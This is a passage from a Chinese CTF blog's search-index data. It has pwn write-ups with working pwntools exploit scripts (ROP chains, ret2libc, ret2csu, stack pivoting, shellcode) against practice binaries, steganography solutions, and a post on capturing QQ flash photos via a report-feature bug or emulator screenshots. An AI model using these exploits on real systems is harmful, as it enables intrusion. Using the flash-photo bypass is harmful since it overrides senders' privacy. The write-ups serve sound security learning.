*r=process(&#x27;./babyrop&#x27;)#r=remote(&#x27;node4.buuoj.cn&#x27;,29817)elf=ELF(&#x27;./babyrop&#x27;)write_plt=elf.plt[&#x27;write&#x27;]read_got=elf.got[&#x27;read&#x27;]read_plt=elf.plt[&#x27;read&#x27;]main_addr=0x8048825libc=ELF(&#x27;/home/krito/CTF/libc-2.23.so&#x27;)   # 使用题目给的libc，本地调试时用自己的payload1=&#x27;\\x00&#x27;+&#x27;a&#x27;*0x6+&#x27;\\xff&#x27;r.sendline(payload1)r.recvuntil(&#x27;Correct\\n&#x27;)payload=&#x27;a&#x27;*0xe7+&#x27;b&#x27;*0x4payload+=p32(write_plt)+p32(main_addr)+p32(1)+p32(read_got)+p32(0x8)r.sendline(payload)read_addr=u32(r.recv(4))print(&#x27;[+]read_addr: &#x27;,hex(read_addr))libc_base=read_addr-libc.sym[&#x27;read&#x27;]system_addr=libc_base+libc.sym[&#x27;system&#x27;]bin_sh_addr=libc_base+libc.search(&#x27;/bin/sh&#x27;).next()r.sendline(payload1)r.recvuntil(&#x27;Correct\\n&#x27;)payload=&#x27;a&#x27;*0xe7+&#x27;b&#x27;*0x4payload+=p32(system_addr)+&#x27;a&#x27;*4+p32(bin_sh_addr)r.sendline(payload)r.interactive()\n\n","slug":"BUU-PWN","date":"2021-10-16T05:47:11.000Z","categories_index":"刷题","tags_index":"pwn","author_index":"Krito"},{"id":"794e58abd4973dfacdc6d660b3849142","title":"BUU misc","content":"金三胖下载附件，打开是gif，仔细看发现gif会闪现一些字符，通过利用Stegsolve或者PS逐帧分析合并就可得到flag\n\n二维码在线扫码，得到secret is here\n用winhex打开发现图片里面藏了压缩包，压缩包里面有一个4number.txt文件\n利用binwalk分离得到一个加密的文件，4number应该是提示，提示密码只有四位数，直接爆破得到密码，打开flag\nN种方法解决附件是exe文件，无法直接运行，拖进winhex里面发现是十六进制是base64编码的图片，解码得到二维码，扫码得到flag\n大白题目给了提示，是不是屏幕太小了，再看看附件，发现高度明显有问题，直接修改高度得到flag\n你竟然赶我走签到题，将附件拖进winhex，在最下面发现flag\n基础破解提示密码是四位数，直接爆破，得到密码，打开发现内容被加密，猜测是base64\nbase64解码得到flag\n\n乌镇峰会种图签到题，拖进winhex拉到最底下就可以看到flag\nLSB根据题目名，LSB（Least Significant Bit），意为最低有效位；MSB（Most Significant Bit），意为最高有效位。使用Stegsolve\n保存，发现是一个二维码，扫码得到flag\n文件中的秘密拖进winhex，使用binwalk没有发现什么东西，打开照片属性里面发现备注有flag\nrar根据提示爆破，得到密码打开就是flag\n\nqr签到题，扫码得到flag\nzip伪加密看名字就知道是伪加密，拖进winhex，修改后直接打开就能得到flag\nningen将文件丢进winhex，拖到最后可以看到照片里面藏了压缩包，还有一个txt文件\n直接修改后缀名，发现一个加密txt文件，根据题目提示爆破得到密码，打开文件得到flag\n镜子里面的世界使用winhex没有发现什么东西，看到文件名盲猜使用Stegsolve修改最低有效位，果然，得到flag\n小明的保险箱拖进winhex，在文件最后发现有个2.txt文件，猜测里面藏了压缩包，使用binwalk分离，得到压缩包\n根据提示进行爆破得到flag\n爱因斯坦拖进winhex，发现里面藏有压缩包，直接改后缀名，尝试了一下，发现不是伪加密，返回照片查看，在属性备注里面发现密码，改成zip就可以看到flag了\n","slug":"BUU-MISC","date":"2021-10-16T00:48:04.000Z","categories_index":"刷题","tags_index":"misc","author_index":"Krito"},{"id":"cca552dbfefca5d5c398c58d9b5bb49c","title":"QQ闪照破解（待完结）","content":"\n\n\n\n\n\n\n\n\n和朋友聊天时突发奇想，想尝试一下获取闪照源文件，忙了一个下午还是没有解决（主要是太菜了 /(ㄒoㄒ)/~~ ）\n原理和思路闪照貌似是一种木马改编而来，但是因为实用性不高可能就被设计成闪照了（盲猜）。闪照的工作原理大概是有一个FLAG_SECURE窗口，如果启用了FLAG_SECURE，那么将不允许用户在此界面截图/录屏。也就是说，不允许截图这个功能是Android系统提供给开发者的。当时间一过，程序就会自动将闪照删除。在此过程中有个很大的弊端，就是在照片还未读取时，照片会存在于缓存之中，很容易被提取出来查看。\n所以在2021年以前的qq，闪照基本上和普通照片没什么区别，只要在缓存中提取到就可以保存起来。但是现在已经被修复了，网上大部分教程已经失效了。（可能某些大佬自己破解了，只是我不知道）。现在的闪照在缓存中提取到改后缀已经没有用了，因为现在的照片已经被加密了（文件头就写着加密二字😒）\n接下来就是讲讲我自己的思路：\n1、首先找到缓冲区文件，路径（Andriod/data/com.tecent.mobileqq/Tencent/MobileQQ/chatpic/chatimg），里面的东西应该和下面差不多（如果找不到可能是没有打开显示隐藏文件。），之后按照时间顺序找到对应的文件。\n当初找到以后高兴了老半天，结果打开发现被加密了，气的想打人。后面看到一个大佬讲解，发现是des加密（就知道腾讯不会勤快到自己写出算法）他通过TIM2.1.0的apk反编译了一下，发现com.tencent.mobileqq.utils.DESUtil中有几个函数可以加解密闪照图片，发现使用的是javax.crypto加解密。\n这个类大概就是下面这个样子，其中byte[]参数是加解密的key\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167/* * Decompiled with CFR 0_123. */package com.tencent.mobileqq.utils;import com.tencent.mobileqq.utils.FileUtils;import com.tencent.qphone.base.util.QLog;import java.io.File;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.IOException;import java.io.InputStream;import java.io.OutputStream;import java.io.RandomAccessFile;import java.io.UnsupportedEncodingException;import java.security.Key;import javax.crypto.Cipher;import javax.crypto.CipherInputStream;import javax.crypto.CipherOutputStream;import javax.crypto.spec.SecretKeySpec;public class DESUtil &#123;    public static void a(File var0, File var1_6, byte[] var2_8) &#123;\t//加密        var6_15 = new SecretKeySpec(DESUtil.a((byte[])var2_8), &quot;DES&quot;);        var2_8 = Cipher.getInstance(&quot;DES&quot;);        var2_8.init(1, (Key)var6_15);        var6_15 = new FileInputStream((File)var0);        var0 = new FileOutputStream((File)var1_6);        var1_6 = new CipherInputStream((InputStream)var6_15, (Cipher)var2_8);        try &#123;            var2_8 = new byte[1024];            var0.write(&quot;ENCRYPT:&quot;.getBytes(&quot;UTF-8&quot;));//写文件头            while ((var3_16 = var1_6.read((byte[])var2_8)) != -1) &#123;                var0.write((byte[])var2_8, 0, var3_16);            &#125;        &#125;        catch (Exception var4_11) &#123;\t\t//略\t&#125;    &#125;    public static void a(String string, String string2) &#123;\t//带日志的加密函数，里面调用了上面的a(File,File,byte[])        try &#123;            if (DESUtil.a(string)) &#123;                if (QLog.isDevelopLevel()) &#123;                    QLog.d((String)&quot;DESUtil&quot;, (int)2, (String)(&quot;encrypt had encrypt,file:&quot; + string));                    return;                &#125;            &#125; else &#123;                long l = System.currentTimeMillis();                Object object = string + &quot;.tmp&quot;;                File file = new File(string);                long l2 = file.length() / 1024;                if ((object = new File((String)object)).exists()) &#123;                    object.delete();                &#125;                DESUtil.a(file, (File)object, string2.getBytes(&quot;UTF-8&quot;));                FileUtils.a((File)object, (File)file);                object.delete();                if (QLog.isDevelopLevel()) &#123;                    QLog.d((String)&quot;DESUtil&quot;, (int)4, (String)(&quot;DES Encrypt filePath:&quot; + string + &quot;,key:&quot; + string2 + &quot;,costTime:&quot; + (System.currentTimeMillis() - l) + &quot;,fileSize:&quot; + l2 + &quot;KB&quot;));                    return;                &#125;            &#125;        &#125;        catch (UnsupportedEncodingException unsupportedEncodingException) &#123;            unsupportedEncodingException.printStackTrace();        &#125;    &#125;    public static void a(String string, String object, String string2) &#123;\t//还是带日志的加密函数，里面调用了上面的a(File,File,byte[])        try &#123;            if (DESUtil.a(string)) &#123;                if (QLog.isDevelopLevel()) &#123;                    QLog.d((String)&quot;DESUtil&quot;, (int)2, (String)(&quot;encrypt had encrypt,file:&quot; + string));                    return;                &#125;            &#125; else &#123;                long l = System.currentTimeMillis();                File file = new File(string);                long l2 = file.length() / 1024;                if ((object = new File((String)object)).exists()) &#123;                    object.delete();                &#125;                DESUtil.a(file, (File)object, string2.getBytes(&quot;UTF-8&quot;));                file.delete();                if (QLog.isDevelopLevel()) &#123;                    QLog.d((String)&quot;DESUtil&quot;, (int)4, (String)(&quot;DES Encrypt filePath:&quot; + string + &quot;,key:&quot; + string2 + &quot;,costTime:&quot; + (System.currentTimeMillis() - l) + &quot;,fileSize:&quot; + l2 + &quot;KB&quot;));                    return;                &#125;            &#125;        &#125;        catch (UnsupportedEncodingException unsupportedEncodingException) &#123;            unsupportedEncodingException.printStackTrace();        &#125;    &#125;    public static boolean a(String var0) &#123;\t//反编译出来的代码比上面的还乱此略，\t//从QLog写入的内容大致可以看出该函数的作用应该是检查文件是否已经加/解密过    &#125;    public static byte[] a(byte[] arrby) &#123;        //保证key数组定长是8？        byte[] arrby2 = new byte[8];        if (arrby2.length &gt; arrby.length) &#123;            System.arraycopy(arrby, 0, arrby2, 0, arrby.length);            return arrby2;        &#125;        System.arraycopy(arrby, 0, arrby2, 0, arrby2.length);        return arrby2;    &#125;    public static void b(File var0, File var1_5, byte[] var2_7) &#123;\t//解密        var2_7 = new SecretKeySpec(DESUtil.a((byte[])var2_7), &quot;DES&quot;);        var6_15 = Cipher.getInstance(&quot;DES&quot;);        var6_15.init(2, (Key)var2_7);        var2_7 = new RandomAccessFile((File)var0, &quot;r&quot;);        var2_7.seek(&quot;ENCRYPT:&quot;.getBytes(&quot;UTF-8&quot;).length);//跳过文件头        var0 = new CipherOutputStream(new FileOutputStream((File)var1_5), var6_15);        try &#123;            var1_5 = new byte[1024];            while ((var3_16 = var2_7.read((byte[])var1_5)) != -1) &#123;                var0.write((byte[])var1_5, 0, var3_16);            &#125;        &#125;        catch (Exception var4_10) &#123;            //略        &#125;    &#125;    public static void b(String string, String string2) &#123;\t//带日志的解密        try &#123;            if (!DESUtil.a(string)) &#123;                if (QLog.isDevelopLevel()) &#123;                    QLog.d((String)&quot;DESUtil&quot;, (int)2, (String)(&quot;decrypt had no encrypt,file:&quot; + string));                    return;                &#125;            &#125; else &#123;                long l = System.currentTimeMillis();                Object object = string + &quot;.tmp&quot;;                File file = new File(string);                long l2 = file.length() / 1024;                if ((object = new File((String)object)).exists()) &#123;                    object.delete();                &#125;                DESUtil.b(file, (File)object, string2.getBytes(&quot;UTF-8&quot;));                FileUtils.a((File)object, (File)file);                object.delete();                if (QLog.isDevelopLevel()) &#123;                    QLog.d((String)&quot;DESUtil&quot;, (int)4, (String)(&quot;DES Decrypt filePath:&quot; + string + &quot;,key:&quot; + string2 + &quot;,costTime:&quot; + (System.currentTimeMillis() - l) + &quot;,fileSize:&quot; + l2 + &quot;KB&quot;));                    return;                &#125;            &#125;        &#125;        catch (UnsupportedEncodingException unsupportedEncodingException) &#123;            unsupportedEncodingException.printStackTrace();        &#125;    &#125;&#125;\n\n我以为胜利在望，我请教了师兄，发现其中几个包得不到，根本破解不了（o(*≧▽≦)ツ┏━┓）\n1234package com.tencent.mobileqq.utils;import com.tencent.mobileqq.utils.FileUtils;import com.tencent.qphone.base.util.QLog;\n\n除此之外，还不知道key从何来，大佬也说要么需要处于登录状态用一定方式从服务器得到，要么从本地消息对象的属性中获得，反正哪个都不容易，单靠一个_fp文件就解密出来原文件应该不太现实。所以我就只能放弃了。\n破解方法虽然前面说了没解出来，但是不代表不能获得照片啊（￣︶￣）↗　\n提供三种方法：\n\n方法一：利用bug实现，举报好友填写信息时勾选闪照，在举报成功后会显示闪照内容（好友：我tm真的谢谢你），不过我觉得后面腾讯应该会修复。\n\n方法二：最简单的，用另一个手机拍照，最实用最靠谱的(～￣▽￣)～\n\n方法三：利用模拟机打开qq，在模拟机里面是无法限制主机截图的，下载一个VMOS模拟机后（应用商店有）在里面下载一个qq打开闪照时就可以截图了[](￣▽￣)*\n\n\n个人观点：我觉得非必要情况没必要去获得闪照，毕竟别人发闪照就是不想让你保存，所以看看就行了\n","slug":"QQ闪照","date":"2021-10-13T11:02:46.000Z","categories_index":"","tags_index":"感想","author_index":"Krito"},{"id":"2d83114abbe0d2e1d7c9af7e01c50ee1","title":"ROP-x64","content":"\n\n\n\n\n\n\n\n\n之前在前面写了一篇介绍ROP的，不过是32位的，因为64位和32位多多少少有不同点，所以这次就介绍64位下的ROP\npwn07做法和之前32位的ret2libc3思路是一致的，泄露puts函数地址找到libc计算出system函数地址从而获取shell。**64位是通过寄存器传递参数(当参数小于7个时，参数从左到右放入寄存器rdi,rsi,rdx,rcx,r8,r9)**，所以执行system(“bin/sh”)时rdi寄存器要存储的是bin/sh字符串，例如：\n泄露puts函数地址需要先将puts的got表地址传递到rdi寄存器中在跳转到puts函数输出\n1payload1 = &#x27;a&#x27;*20 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)\n\n在执行system函数时不仅要记住通过rdi传参还要注意堆栈对齐：\n1payload = &#x27;a&#x27;*20+p64(ret_addr)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_addr)\n\np64(ret_addr)目的用于堆栈对齐，不然后面会报错。\nEXP123456789101112131415161718192021from pwn import *from LibcSearcher import LibcSearcher#p = process(&#x27;./pwn1&#x27;)p = remote(&#x27;pwn.challenge.ctf.show&#x27;,28138)pop_rdi_ret = 0x04006e3  # ROPgadget --binary pwn1 --only &#x27;pop|ret&#x27;|grep &#x27;rdi&#x27;ret_addr = 0x4004c6 # ROPgadget --binary pwn1 --only &#x27;ret&#x27;elf = ELF(&#x27;./pwn1&#x27;)puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]start_addr = elf.symbols[&#x27;_start&#x27;]payload1 = &#x27;a&#x27;*20 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)  # 泄露puts函数的地址p.sendline(payload1)p.recvuntil(&#x27;\\x0a&#x27;)libc_puts_addr = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))  # 接收地址libc = LibcSearcher(&#x27;puts&#x27;, libc_puts_addr)  # 匹配libc库libcbase = libc_puts_addr - libc.dump(&#x27;puts&#x27;)  # 计算基地址sys_addr = libcbase+libc.dump(&#x27;system&#x27;)  # 计算system函数地址bin_sh = libcbase+libc.dump(&#x27;str_bin_sh&#x27;)  # 计算bin/sh字符串地址payload = &#x27;a&#x27;*20+p64(0x4004c6)+p64(pop_rdi_ret)+p64(bin_sh)+p64(sys_addr)  # 构造rop链p.sendline(payload)p.interactive()\n\nret2csu由于程序没有调用puts函数，我们不能通过puts函数泄露函数地址得到libc。所以，这次我们利用一个万能gadgets来泄露函数地址获得libc，这个gadgets在__ libc_csu_init函数里面，而这个  __libc_csu_init函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。\n通过objdump -M intel -d level5命令来查看反汇编，将其中一部分指令划分为gadgets1和gadgets2，其中gadgets1作用是将栈里面的值传给寄存器，而gadgets2作用是将一些寄存器的赋给另一些寄存器。\n接下来就是利用这个gadgets来获取shell\n\n利用栈溢出执行 libc_csu_gadgets 组装好 write 函数并泄露write函数地址，并使得程序重新执行 main 函数\n根据 libcsearcher 获取对应 libc 版本以及system函数地址\n再次利用栈溢出执行 libc_csu_gadgets 向 bss 段写入system 地址以及 ‘/bin/sh’ 地址，并使得程序重新执行 main 函数。\n再次利用栈溢出执行 libc_csu_gadgets 执行system(‘/bin/sh’) 获取 shell。\n\n\n下图展示了如何利用万能gadgets的流程：\n\n第一次发送payload：1payload1 = &#x27;a&#x27;*0x80+&#x27;a&#x27;*8+p64(0x400606)+p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) + p64(0x4005F0) + &quot;a&quot;*56 + p64(main_addr)\n\np64(0x400606)：是gadgets1的地址\np64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write)+ p64(8) ：对应的寄存器为rbx,rbp,r12,r13,r14,r15\nrbx存入0是因为gadgets2中rbx会加1再与rbp比较，如果不同就会跳转，不能继续按我们的要求执行，所以必须保证rbx加1以后要和rbp的值一样，所以后面的rbp填入1；p64(gadgets1)将会填入r12，因为gadgets2会跳转到r12+rbx * 8的位置，因为rbx为0所以就是跳转到r12的位置； p64(1) + p64(got_write) + p64(8)将会填入r13,r14,r15寄存器，再gadgets2中会转移到edi,rsi,rdx中，也就是用于传参的前三个寄存器；p64(got_write) + p64(1) + p64(got_write)+ p64(8)最后组装成write(1,address,8)泄露write函数地址\np64(0x4005F0)：是gadgets2的地址\n“a”*56+p64(main_addr) ：因为gadgets2后面是gadgets1，gadgets1会弹出栈里面的值，为了不让gadgets1影响后面操作，就填入无用字符串，最后跳转会main函数\n\n第二次发送payload：1payload2 =  &quot;\\x00&quot;*136+p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16)+p64(0x4005F0)+&quot;a&quot;*56+p64(main)\n\n p64(got_read) + p64(0) + p64(bss_addr) + p64(16)：组装成read(0,bss_addr,16)，作用是向bss段写入16字节的东西\n\n第三次发送payload1payload3 =  &quot;\\x00&quot;*136 + p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0) + p64(0x4005F0) + &quot;a&quot;*56 + p64(main_addr)\n\np64(bss_addr) + p64(bss_addr+8)+ p64(0) + p64(0)：组装成system(“bin/sh”)，因为只有一个参数所以后面两个填零不会造成什么影响\n\nEXP1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *from LibcSearcher import LibcSearcherelf = ELF(&#x27;level5&#x27;)p = process(&#x27;./level5&#x27;)got_write = elf.got[&#x27;write&#x27;]got_read = elf.got[&#x27;read&#x27;]start = elf.symbols[&#x27;_start&#x27;]  payload1 =  &quot;a&quot;*136payload1 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8)   # 跳转到gadgets1并构造write函数泄露write函数payload1 += p64(0x4005F0)   # 跳转到gadgets2将对应参数放入对应寄存器payload1 += &quot;a&quot;*56payload1 += p64(start)p.recvuntil(&quot;Hello, World\\n&quot;)print &quot;\\n#############sending payload1#############\\n&quot;p.send(payload1)write_addr = u64(p.recv(6).ljust(8,b&#x27;\\x00&#x27;))  # 接收地址libc = LibcSearcher(&#x27;write&#x27;, write_addr)libcbase = write_addr-libc.dump(&#x27;write&#x27;)system_addr = libcbase+libc.dump(&#x27;system&#x27;)print &#x27;system_address:&#x27;,system_addrprint &#x27;libcbase:&#x27;,libcbasebss_addr=0x601028  # 用于写入system函数以及bin/sh字符串p.recvuntil(&quot;Hello, World\\n&quot;)payload2 =  &quot;a&quot;*136payload2 += p64(0x400606) + p64(0) + p64(0) + p64(1) + p64(got_read) + p64(0) + p64(bss_addr) + p64(16)   # 构造read函数向bss段写入数据payload2 += p64(0x4005F0) payload2 += &quot;a&quot;*56payload2 += p64(start)print &quot;\\n#############sending payload2#############\\n&quot;p.send(payload2)p.send(p64(system_addr))p.send(&quot;/bin/sh\\0&quot;)p.recvuntil(&quot;Hello, World\\n&quot;)payload3 =  &quot;a&quot;*136payload3 += p64(0x400606) + p64(0) +p64(0) + p64(1) + p64(bss_addr) + p64(bss_addr+8) + p64(0) + p64(0)   # 跳转执行bss段中的内容payload3 += p64(0x4005F0) payload3 += &quot;a&quot;*56payload3 += p64(start)print &quot;\\n#############sending payload3#############\\n&quot;p.send(payload3)p.interactive()\n\n\nframe faking题目存在溢出，但是只溢出16个字节，而64位要构造rop链通常需要4*8=32字节，所以无法直接泄露。但是这个题目是无限输入的，所以我们可以尝试采取栈迁移的方式。栈迁移适用于以下情况：\n\n可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链\n开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。\n其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用\n\n所以基本思路就是，先在栈上面构建好ROP链，之后让程序跳转执行我们构建好的ROP链。但是我们需要知道跳转地址，也就是我们构造好ROP链的位置。\n程序会一直执行这个函数，函数会使用read函数将输入内容写入buf变量，再用puts函数输出。read函数不同于gets函数，read读取完以后不会像gets函数一样在数据后面补充\\0，所以只要我们将缓冲区填满，就可以泄露rbp指向的地址了，再通过计算偏移就可以确定栈的位置了。\n\n接下来就是计算偏移0x7fffffffde40-0x7fffffffddd0=0x70\n\n所以payload2就构建好了\n123stack = u64(io.recvuntil(&quot;\\x7f&quot;)[-6: ].ljust(8, &#x27;\\0&#x27;)) - 0x70payload = &#x27;a&#x27;*8+p64(pop_rdi_ret)+p64(elf.got[&#x27;puts&#x27;])+p64(elf.plt[&#x27;puts&#x27;])+p64(0x400676)payload += (&#x27;a&#x27;*(80-len(payload))+p64(stack)+p64(0x4006be)) #leave_ret\n\n接下来就是匹配libc库以及计算system以及bin/sh的地址\n123456puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8, &#x27;\\0&#x27;))libc=LibcSearcher(&quot;puts&quot;,puts_addr)libcbase = puts_addr - libc.dump(&quot;puts&quot;)success(&quot;libc.address -&gt; &#123;:#x&#125;&quot;.format(libcbase))system_addr=libcbase+libc.dump(&quot;system&quot;)binsh_addr=libcbase+libc.dump(&quot;str_bin_sh&quot;)\n\n由于利用过程中栈的结构会发生变化, 所以一些关键的偏移还需要通过调试来确定\n\n第三次输入时，rbp指向地址对应栈帧偏移不再是stack了，而是stack-0x30了。修改后得到payload3\n12payload=flat([&#x27;a&#x27;*8, ret_addr,pop_rdi_ret,binsh_addr,system_addr])payload += (&#x27;a&#x27;*(80-len(payload))+p64(stack)+p64(0x4006be))\n\nEXP1234567891011121314151617181920212223242526from pwn import *from LibcSearcher import *context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;context.binary = &quot;./over.over&quot;pop_rdi_ret = 0x400793ret_addr = 0x0400509io = process(&quot;./over.over&quot;)elf = ELF(&quot;./over.over&quot;)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)io.sendafter(&quot;&gt;&quot;, &#x27;a&#x27; * 80)stack = u64(io.recvuntil(&quot;\\x7f&quot;)[-6: ].ljust(8, &#x27;\\0&#x27;)) - 0x70success(&quot;stack -&gt; &#123;:#x&#125;&quot;.format(stack))payload = &#x27;a&#x27;*8+p64(pop_rdi_ret)+p64(elf.got[&#x27;puts&#x27;])+p64(elf.plt[&#x27;puts&#x27;])+p64(0x400676)payload += (&#x27;a&#x27;*(80-len(payload))+p64(stack)+p64(0x4006be)) #leave_retio.sendafter(&quot;&gt;&quot;, payload)puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8, &#x27;\\0&#x27;))libc=LibcSearcher(&quot;puts&quot;,puts_addr)libcbase = puts_addr - libc.dump(&quot;puts&quot;)success(&quot;libc.address -&gt; &#123;:#x&#125;&quot;.format(libcbase))system_addr=libcbase+libc.dump(&quot;system&quot;)binsh_addr=libcbase+libc.dump(&quot;str_bin_sh&quot;)payload=flat([&#x27;a&#x27;*8, ret_addr,pop_rdi_ret,binsh_addr,system_addr])payload += (&#x27;a&#x27;*(80-len(payload))+p64(stack-0x30)+p64(0x4006be))io.sendlineafter(&quot;&gt;&quot;, payload)io.interactive()\n\n\n\n","slug":"ROP-x64","date":"2021-10-05T11:59:10.000Z","categories_index":"学习记录","tags_index":"pwn","author_index":"Krito"},{"id":"a1737faa9c5d2f3d8075974e9ccad146","title":"ROP-x86","content":"ROP原理随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。\n之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件\n\n程序存在溢出，并且可以控制返回地址。\n可以找到满足条件的 gadgets 以及相应 gadgets 的地址。\n\n如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。\nret2text方法控制程序执行程序本身已有的的代码 (.text)\n思路首先查看附件，32位可执行文件且只开了NX保护\n\n利用IDA查看伪代码，可以看到，主函数存在栈溢出漏洞\n不仅如此，在secure函数中发现了系统调用，其地址为0x0804863A，所以我们可以利用secure函数的代码来获取系统的shell\n接下来就是计算s的偏移量。设置断点0x08048641，进行调试\n可以看到，esp指向地址为0xffffcf70，ebp指向地址为0xffffcff8，因为s的地址为esp+0x1c，所以s相当于ebp的偏移量为：0xffffcff8-0xffffcf70-0x1c=0x6c，s相当于返回地址的偏移量为： 0x6c+4\nEXP123456from pwn import *sh = process(&#x27;./ret2text&#x27;)target = 0x804863ash.sendline(&#x27;a&#x27; * (0x6c+4) + p32(target))sh.interactive()\n\n通过栈溢出直接跳转到对应的后门函数，从而获取shell，堆栈图如下：\n\nret2shellcode方法程序执行我们自己填充的shellcode代码\n思路按照ret2text思路，发现存在栈溢出，计算出s相对于返回地址的偏移量为112。查看字符串，并没有发现system函数，但是我们发现我们输入的字符串会复制到buf2，所以我们可以利用buf2构造shellcode代码，\n先判断一下buf2所在地址是否可执行。利用IDA查看buf2的地址\n在查看一下这个地址是否可执行。发现这个地址可读可写可执行。\n之后构建payload\nEXP12345678910111213from pwn import *sh = process(&#x27;./ret2shellcode&#x27;)buf2 = 0x804A080shellcode = asm(shellcraft.sh())payload = shellcode.ljust(112, &#x27;a&#x27;) + p32(buf2)sh.sendline(payload)sh.interactive()&quot;&quot;&quot;解释一下&quot;&quot;&quot;&quot;&quot;&quot;shellcraft.sh作用是生成好system(&quot;bin/sh&quot;)的代码&quot;&quot;&quot;&quot;&quot;&quot;asm函数是将代码转成机器指令&quot;&quot;&quot;&quot;&quot;&quot;ljust函数作用就是向右对其并用给定字符补充字符串&quot;&quot;&quot;\n\n通过栈溢出跳转到我们写好shellcode的区域，让程序执行shellcode从而获取shell\n\nret2syscall方法控制程序执行系统调用，获取 shell。\n思路先查看附件\n\n接下来利用 IDA 来查看源码，并没有system函数，而且也没有bin/sh字符\n可以看到，函数存在栈溢出，接下来就是计算v4的偏移量。先设置断点，将断点设置在调用gets函数那里\n接下来就是调试。可以看到esp指向地址0xffffcf80，v4的地址为esp+1c，ebp指向的地址0xffffd008，由此可以计算出v4的偏移量为0xffffd008-0xffffcf80-0x1c=108，所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。\n此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。（系统调用基本知识）我们可以通过执行 int 0x80 来执行对应的系统调用。对于这道题，我们可以使用这个系统调用**execve(“/bin/sh”,NULL,NULL)**，其中，该程序是 32 位，这个系统调用需要满足的条件：\n\n系统调用号，即 eax 应该为 0xb（是指系统调用编号）\n第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。\n第二个参数，即 ecx 应该为 0\n第三个参数，即 edx 应该为 0\n\n64位shellcode的参数和execve调用应为：\n\nrax = 0x3b\nrdi指向”/bin/sh”\nrsi = 0x0\nrdx = 0x0\nexecve(“/bin/sh”, 0, 0);\n\n为满足这些条件，我们可以使用 gadgets来完成。如利用堆栈对寄存器赋值，先将10存入栈中，再pop eax。所以，接下来就是寻找符合条件的gadgets。（ROPgadget安装与使用方法）\n接下来就是组装：**payload = flat([‘A’ * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, bin_sh, int_0x80])**，其中 0xb 为 execve 对应的系统调用号。\nEXP1234567891011from pwn import *sh = process(&#x27;./rop&#x27;)pop_eax_ret = 0x080bb196pop_edx_ecx_ebx_ret = 0x0806eb90int_0x80 = 0x08049421bin_sh = 0x80be408payload =&#x27;A&#x27; * 112+p32(pop_eax_ret)+ p32(0xb)+p32(pop_edx_ecx_ebx_ret)+p32(0)+p32(0)+p32(bin_sh)+p32(int_0x80)sh.sendline(payload)sh.interactive()\n\n\nret2libc1方法利用gadgets构建ROP获取shell\n思路check一下32位程序，且只开了NX保护\n\n丢进IDA，查看伪代码，存在gets函数，很明显存在栈溢出\n查看函数列表以及字符串列表，很明显可以构建ROP\n最后就是计算偏移量。s的偏移量0xffffcfb8-ffffcf4c=6c，相对于返回地址的偏移量6c+4\nEXP12345678from pwn import *p = process(&quot;./ret2libc1&quot;)sys_addr = 0x8048460bin_sh = 0x08048720payload = &#x27;a&#x27;*112+p32(sys_addr)+‘a&#x27;*4+p32(bin_sh)p.sendline(payload)p.interactive()&quot;&quot;&quot;因为调用system函数中途需要一个返回地址，而直接利用system gadget会导致缺失返回地址，所以需要一个虚拟地址p32(0x11111111)平衡堆栈&quot;&quot;&quot;\n\n\nret2libc2ida查看，可以看到这里有system函数，但是没有bin/sh，但是这里有gets函数，我们可以利用gets函数传入bin/sh字符，从而利用system获取shell\n\n\n计算好偏移，将通过gets获取的字符存入到bss段可写区域\n\nEXP123456789from pwn import *p = process(&quot;./ret2libc2&quot;)sys_addr = 0x08048490bss = 0x804a000gets_addr = 0x8048460pop_ebx = 0x0804843dpayload = &#x27;a&#x27;*0x70+p32(gets_addr)+p32(sys_addr)+p32(bss)+p32(bss)p.sendline(payload)p.interactive()\n\n栈示意图如下：\n\nret2libc3思路这次的题目没有system函数，也没有bin/sh字符串，也不像ret2shellcode可以跳转执行shellcode，因此，只能换过一种思路。在libc.so 